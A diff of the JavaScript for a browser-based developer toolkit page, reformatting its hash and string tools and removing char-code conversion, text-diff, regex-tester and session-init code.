-  document.getElementById('hash-results').innerHTML = results.map(r => `
-    <div class="hash-row">
+  document.getElementById('hash-results').innerHTML = results.map(r =>
+    `<div class="hash-row">
       <div class="hash-name">${r.name}</div>
       <div class="hash-val" title="${r.hex}">${r.hex}</div>
-      <button class="btn btn-ghost" onclick="navigator.clipboard.writeText('${r.hex}')">Copy</button>
-    </div>`).join('');
+      <button class="btn btn-ghost" onclick="navigator.clipboard.writeText('${r.hex}');copyOutput('hash-in')">Copy</button>
+    </div>`
+  ).join('');
 }
 
-// ═══════════════════════════════════════════════
-// STRING TOOLS
-// ═══════════════════════════════════════════════
+// ══════════════════════════════════════════
+//  STRING TOOLS
+// ══════════════════════════════════════════
 function strTool(op) {
-  const val = document.getElementById('str-in').value;
-  let out = val;
-  switch(op) {
-    case 'reverse':  out = val.split('').reverse().join(''); break;
-    case 'upper':    out = val.toUpperCase(); break;
-    case 'lower':    out = val.toLowerCase(); break;
-    case 'title':    out = val.replace(/\b\w/g, c => c.toUpperCase()); break;
-    case 'trim':     out = val.split('\n').map(l => l.trim()).join('\n').trim(); break;
-    case 'dedupe':   out = [...new Set(val.split('\n'))].join('\n'); break;
-    case 'sort':     out = val.split('\n').sort((a,b) => a.localeCompare(b)).join('\n'); break;
-    case 'sortz':    out = val.split('\n').sort((a,b) => b.localeCompare(a)).join('\n'); break;
-    case 'linerev':  out = val.split('\n').reverse().join('\n'); break;
-    case 'count':
-      const chars = val.length, words = val.trim() ? val.trim().split(/\s+/).length : 0, lines = val.split('\n').length;
-      out = `Characters: ${chars}\nWords: ${words}\nLines: ${lines}\n\n${val}`;
+  const v = document.getElementById('str-in').value;
+  let out = v;
+  switch (op) {
+    case 'reverse':  out = v.split('').reverse().join(''); break;
+    case 'upper':    out = v.toUpperCase(); break;
+    case 'lower':    out = v.toLowerCase(); break;
+    case 'title':    out = v.replace(/\b\w/g, c => c.toUpperCase()); break;
+    case 'trim':     out = v.split('\n').map(l => l.trim()).join('\n').trim(); break;
+    case 'dedupe':   out = [...new Set(v.split('\n'))].join('\n'); break;
+    case 'sort':     out = v.split('\n').sort((a, b) => a.localeCompare(b)).join('\n'); break;
+    case 'sortz':    out = v.split('\n').sort((a, b) => b.localeCompare(a)).join('\n'); break;
+    case 'linerev':  out = v.split('\n').reverse().join('\n'); break;
+    case 'count': {
+      const chars = v.length, words = v.trim() ? v.trim().split(/\s+/).length : 0, lines = v.split('\n').length;
+      out = `Characters: ${chars}\nWords: ${words}\nLines: ${lines}\n\n${v}`;
       break;
+    }
   }
   document.getElementById('str-out').value = out;
 }
 
-// ═══════════════════════════════════════════════
-// CHAR CODE
-// ═══════════════════════════════════════════════
-function charEncode() {
-  const val = document.getElementById('cc-in').value;
-  const fmt = document.getElementById('cc-fmt').value;
-  const codes = Array.from(val).map(c => c.charCodeAt(0));
-  let out;
-  if (fmt === 'dec') out = codes.join(', ');
-  else if (fmt === 'hex') out = codes.map(c => '0x' + c.toString(16).padStart(2,'0')).join(', ');
-  else if (fmt === 'jsarr') out = '[' + codes.map(c => '0x' + c.toString(16).padStart(2,'0')).join(', ') + ']';
-  else if (fmt === 'csharp') out = 'new byte[] { ' + codes.map(c => '0x' + c.toString(16).padStart(2,'0').toUpperCase()).join(', ') + ' }';
-  else out = 'String.fromCharCode(' + codes.join(', ') + ')';
-  document.getElementById('cc-out').value = out;
-}
-function charDecode() {
-  let val = document.getElementById('cc-in').value.trim();
-  try {
-    val = val.replace(/String\.fromCharCode\(|\)/g,'').replace(/\[|\]/g,'').replace(/new byte\[\]\s*\{|\}/g,'');
-    const codes = val.split(/[\s,]+/).filter(Boolean).map(v => {
-      v = v.trim();
-      return (v.startsWith('0x') || v.startsWith('0X')) ? parseInt(v,16) : parseInt(v);
-    });
-    document.getElementById('cc-out').value = codes.map(c => String.fromCharCode(c)).join('');
-  } catch(e) { notice('cc-notice','notice-err','Parse failed.'); }
-}
-
-// ═══════════════════════════════════════════════
-// TEXT DIFF
-// ═══════════════════════════════════════════════
-function computeDiff() {
-  const aLines = document.getElementById('diff-a').value.split('\n');
-  const bLines = document.getElementById('diff-b').value.split('\n');
-  const out = document.getElementById('diff-out');
-
-  const m = aLines.length, n = bLines.length;
-  const dp = Array.from({length: m+1}, () => new Array(n+1).fill(0));
-  for (let i = m-1; i >= 0; i--)
-    for (let j = n-1; j >= 0; j--)
-      dp[i][j] = aLines[i] === bLines[j] ? dp[i+1][j+1]+1 : Math.max(dp[i+1][j], dp[i][j+1]);
-
-  const lines = [];
-  let i=0, j=0;
-  while (i < m || j < n) {
-    if (i < m && j < n && aLines[i] === bLines[j]) {
-      lines.push({ type:'same', text: aLines[i] }); i++; j++;
-    } else if (j < n && (i >= m || dp[i+1][j] >= dp[i][j+1])) {
-      lines.push({ type:'add', text: bLines[j] }); j++;
-    } else {
-      lines.push({ type:'del', text: aLines[i] }); i++;
-    }
-  }
-
-  let adds=0, dels=0;
-  out.innerHTML = lines.map(l => {
-    if (l.type==='add') { adds++; return `<div style="color:#4ade80;background:rgba(34,197,94,.07);padding:0 4px;">+ ${escHtml(l.text)}</div>`; }
-    if (l.type==='del') { dels++; return `<div style="color:#f87171;background:rgba(239,68,68,.07);padding:0 4px;">- ${escHtml(l.text)}</div>`; }
-    return `<div style="color:var(--text-3);padding:0 4px;">  ${escHtml(l.text)}</div>`;
-  }).join('') || '<div style="color:var(--text-3);">No differences found.</div>';
-  out.insertAdjacentHTML('afterbegin', `<div style="color:var(--text-2);font-size:11px;margin-bottom:8px;padding-bottom:6px;border-bottom:1px solid var(--border);">+${adds} additions  −${dels} deletions</div>`);
-}
-
-function escHtml(s) {
-  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-}
-
-// ═══════════════════════════════════════════════
-// REGEX TESTER
-// ═══════════════════════════════════════════════
-function regexTest() {
-  const pattern = document.getElementById('rx-pattern').value;
-  const flags = document.getElementById('rx-flags').value;
-  const input = document.getElementById('rx-input').value;
-  const results = document.getElementById('rx-results');
-  const count = document.getElementById('rx-count');
-  const countVal = document.getElementById('rx-count-val');
-
-  if (!pattern) {
-    results.innerHTML = '<div style="color:var(--text-3);">Enter a pattern above.</div>';
-    count.style.display = 'none'; return;
-  }
-
-  let rx;
-  try {
-    rx = new RegExp(pattern, flags.replace(/[^gimsuy]/g,''));
-    document.getElementById('rx-notice').classList.remove('show');
-  } catch(e) {
-    notice('rx-notice','notice-err','Invalid regex: ' + e.message);
-    results.innerHTML = '<div style="color:var(--text-3);">Fix the pattern above.</div>';
-    count.style.display = 'none'; return;
-  }
-
-  const matches = [...input.matchAll(new RegExp(pattern, flags.replace(/[^gimsuy]/g,'').includes('g') ? flags : flags+'g'))];
-  if (!matches.length) {
-    results.innerHTML = '<div style="color:var(--text-2);">No matches.</div>';
-    count.style.display = 'none'; return;
-  }
-
-  countVal.textContent = matches.length;
-  count.style.display = '';
-
-  results.innerHTML = matches.map((m, idx) => {
-    const groups = m.slice(1).map((g, i) => `<span style="color:var(--teal)">Group ${i+1}:</span> ${escHtml(g ?? '(undefined)')}`).join(' · ');
-    return `<div style="margin-bottom:6px;padding:4px 6px;background:var(--bg-2);border-radius:4px;">
-      <span style="color:var(--accent-hi)">Match ${idx+1}:</span> <span style="color:var(--text-0)">${escHtml(m[0])}</span>
-      <span style="color:var(--text-3);font-size:10px;"> @ index ${m.index}</span>
-      ${groups ? `<div style="font-size:11px;color:var(--text-2);margin-top:2px;">${groups}</div>` : ''}
-    </div>`;
-  }).join('');
-}
-
-// ═══════════════════════════════════════════════
-// INIT
-// ═══════════════════════════════════════════════
-(function init() {
-  ensureAdmin();
-  buildDash();
-
-  const session = getSession();
-  if (session) {
-    enterApp(session);
-  } else {
-    document.getElementById('auth-screen').classList.remove('hidden');
-    document.getElementById('app-shell').style.display = 'none';
-  }
-})();
-</script>
-</body>
-</html>
+// ═══════════
